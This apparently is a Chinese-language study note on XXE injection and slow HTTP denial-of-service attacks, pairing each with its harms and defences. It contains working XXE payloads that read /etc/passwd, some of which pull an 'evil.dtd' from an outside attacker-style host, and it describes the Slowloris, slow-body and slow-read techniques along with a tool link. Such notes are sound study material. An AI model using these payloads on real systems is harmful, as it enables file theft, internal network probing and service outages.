### XXE是什么？攻击方法？危害？防御方法？
#### XXE是什么？
先了解，外部实体声明:<!ENTITY 实体名称 SYSTEM "URI">，示例如下：
```
<?xml version="1.0"?>
<!DOCTYPE test [
	<!ENTITY writer SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
	<!ENTITY copyright SYSTEM "http://www.w3school.com.cn/dtd/entities.dtd">
]>
<author>&writer;&copyright;</author>
```
xxe也就是xml外部实体注入。
#### XXE攻击方法
a. 直接通过DTD外部实体声明
```
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY b SYSTEM "file:///etc/passwd">
]>
<c>&b;</c>
```
b. 通过DTD文档引入外部DTD文档，再引入外部实体声明

XML内容：
```
<?xml version="1.0"?>
<!DOCTYPE a SYSTEM "http://mark4z5.com/evil.dtd">
<c>&b;</c>
```
DTD文件内容：
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```
c. 通过DTD外部实体声明引入外部实体声明

XML内容：
```
<?xml version="1.0"?>
<!DOCTYPE a [
	<!ENTITY % d SYSTEM "http://mark4z5.com/evil.dtd">
	%d;
]>
<c>&b;</c>
```
DTD文件内容：
```
<!ENTITY b SYSTEM "file:///etc/passwd">
```
#### XXE危害
```
a. 任意文件读取
b. 执行系统命令
c. 探测内网端口
d. 攻击内网
```
#### XXE防御方法
```
a. 禁用外部实体声明
b. 过滤关键词（<!DOCTYPE，<!ENTITY，SYSTEM等）
```

### 慢连接攻击
	1) 原理：使服务器等待，让其在保持连接的情况下消耗资源
	2) 工具: [slowhttptest](https://github.com/shekyan/slowhttptest)
	3) 分类：
	  a) Slowloris(slow headers)
	    HTTP Request以\r\n\r\n（0d0a0d0a）结尾表示客户端发送结束，服务端开始处理。利用这个特性，一直不发送\r\n\r\n,服务端认为HTTP头部没有接收完成而一直等待。
	  b) Slow http post(slow body)
	    POST中设置content-length，提交头部后，慢速发送少量字节，使得服务器一直等待
	  c) Slow read attack
	    控制TCP的滑动窗口大小，使得服务器发送response时，需要拆分成很多个包发送，造成资源浪费。
	4) 防御：
	  a) 设置请求读取超时时间(RequestReadTimeout)
	  b) 设置keep-alive超时时间(KeepAliveTimeout)
	  c) 设置连接超时时间(Timeout)
	  P.S. Nginx能很好防御慢连接攻击

